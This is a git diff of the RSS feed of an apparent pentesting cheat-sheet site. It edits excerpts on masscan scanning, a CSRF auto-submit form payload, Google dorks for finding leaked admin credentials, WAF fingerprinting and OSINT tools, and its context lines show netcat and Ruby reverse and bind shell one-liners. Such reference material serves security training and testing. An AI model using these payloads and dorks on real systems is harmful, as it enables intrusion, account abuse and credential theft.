@@ -104,7 +104,7 @@ linkScrape # linkScrape is another enumeration tool # Pure Web Scrapper → It d
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/recon-enumeration/port-scanning/masscan_cheatsheet/</guid>
-      <description>TODO</description>
+      <description>Usage and Options Target speficication # Target specification masscan 10.0.0.1 masscan 10.0.0.0/24 192.168.1.0/24 # Exclude IP file masscan 10.0.0.1/24 --excludeFile &amp;lt;file&amp;gt; # Exclude a single IP from the scan masscan 180.215.0.0/16 --exclude=180.215.122.120 Port specification # Port specification masscan 10.0.0.0.1 -p 80 masscan 10.0.0.0.1 -p 0-65535 masscan 10.0.0.0.1 -p 80,443 # UDP Scan masscan 10.0.0.0.1 -pU 53 Timing and Performance # Used to scan in offline mode # It does not send any traffic but just estimate the time length masscan 0.</description>
     </item>
     
     <item>
@@ -261,7 +261,7 @@ Teh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/client-side-injections/csrf/</guid>
-      <description>Basic CSRF 0 protection # Basic form &amp;lt;form name=&amp;#34;pls&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;username&amp;#34; value=&amp;#34;devsid&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Status:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;status&amp;#34;checked=&amp;#34;checked&amp;#34; type=&amp;#34;checkbox&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script language=&amp;#34;javascript&amp;#34;&amp;gt;document.pls.submit();&amp;lt;/script&amp;gt;# Basic form &amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;form name=&amp;#34;csrf&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;aaa&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;status&amp;#34; value=&amp;#34;on&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;document.csrf.submit();&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;# Form using XMLHttpRequest &amp;lt;script&amp;gt; var formData = new FormData(); formData.append(&amp;#34;username&amp;#34;, &amp;#34;test&amp;#34;); formData.append(&amp;#34;status&amp;#34;, &amp;#34;on&amp;#34;); var request = new XMLHttpRequest(); request.</description>
+      <description>Basic CSRF 0 protection # Basic form &amp;lt;form name=&amp;#34;pls&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;username&amp;#34; value=&amp;#34;devsid&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Status:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;status&amp;#34;checked=&amp;#34;checked&amp;#34; type=&amp;#34;checkbox&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script language=&amp;#34;javascript&amp;#34;&amp;gt;document.pls.submit();&amp;lt;/script&amp;gt;# Basic form &amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;form name=&amp;#34;csrf&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;aaa&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;status&amp;#34; value=&amp;#34;on&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;document.csrf.submit();&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;# Form using XMLHttpRequest &amp;lt;script&amp;gt; var formData = new FormData(); formData.append(&amp;#34;username&amp;#34;, &amp;#34;test&amp;#34;); formData.append(&amp;#34;status&amp;#34;, &amp;#34;on&amp;#34;); var request = new XMLHttpRequest(); request.</description>
     </item>
     
     <item>
@@ -500,15 +500,6 @@ PHP Serialisation (PHP Slim __wakeup) # Context - \App\Controller\Confidential.p
     </item>
     
     <item>
-      <title>Web Application Firewall (WAF)</title>
-      <link>/open-source-intelligence-osint/technical-recon/web_application_firewall/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/web_application_firewall/</guid>
-      <description>General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks .</description>
-    </item>
-    
-    <item>
       <title>Webshell</title>
       <link>/shells-methods/webshell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -533,8 +524,7 @@ Active Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/dorks/</guid>
-      <description>Automated Dorks Tools # GoogD0rker (https://github.com/ZephrFish/GoogD0rker/) ./googD0rker-txt.py -d example.com # Goohak (https://github.com/1N3/Goohak/ # Just run it on a target domain ./goohak domain.com 
-Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com &amp;lt;searchterm&amp;gt; site:dl.dropbox.com &amp;lt;searchterm&amp;gt; site:s3.amazonaws.com &amp;lt;searchterm&amp;gt; site:onedrive.live.com &amp;lt;searchterm&amp;gt; site:cryptome.org &amp;lt;searchterm&amp;gt; # Admins credentials intext:company_keyword &amp;amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log &amp;amp; intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;administrator&amp;#34; &amp;amp; intext:&amp;#34;password&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;administrator&amp;#34; # Look for domains indexed by others website site:bgp.</description>
+      <description>Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com &amp;lt;searchterm&amp;gt; site:dl.dropbox.com &amp;lt;searchterm&amp;gt; site:s3.amazonaws.com &amp;lt;searchterm&amp;gt; site:onedrive.live.com &amp;lt;searchterm&amp;gt; site:cryptome.org &amp;lt;searchterm&amp;gt; # Admins credentials intext:company_keyword &amp;amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log &amp;amp; intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;administrator&amp;#34; &amp;amp; intext:&amp;#34;password&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;administrator&amp;#34; # Look for domains indexed by others website site:bgp.he.net inurl:ndd site:dnslookup.fr inurl:ndd # Get information on the internal organization sites:cadres.</description>
     </item>
     
     <item>
@@ -605,6 +595,15 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
     </item>
     
     <item>
+      <title>Web Application Firewall (WAF)</title>
+      <link>/recon-enumeration/application-scans/web_application_firewall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/application-scans/web_application_firewall/</guid>
+      <description>General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks .</description>
+    </item>
+    
+    <item>
       <title>XML External Entity (XXE) and XSLT</title>
       <link>/web-attacks/files-inclusions-and-injections/xxe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -652,7 +651,7 @@ Ruby ruby -rsocket -e &amp;#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(&a
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/buscador/</guid>
-      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego	Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities 
+      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities 
 Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application.</description>
     </item>
     
@@ -749,8 +748,7 @@ Usage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--addr
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
       <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php 
-SocialBlade # Socialblade is an online tool where you can see and analyze Youtube, Instagram, Twitch, Twitter or Dailymotion accounts https://socialblade.com/twitter/user/***REMOVED*** 
-Youtube # Yasiv is an online tool allowing to map links and relations between Youtube videos https://yasiv.</description>
+UserRecon https://github.com/thelinuxchoice/userrecon # Find usernames across over 75 social networks. # This is useful if you are running an investigation to determine the usage of # the same username on different social networks. ./userrecon.sh &amp;lt;username&amp;gt;</description>
     </item>
     
     <item>
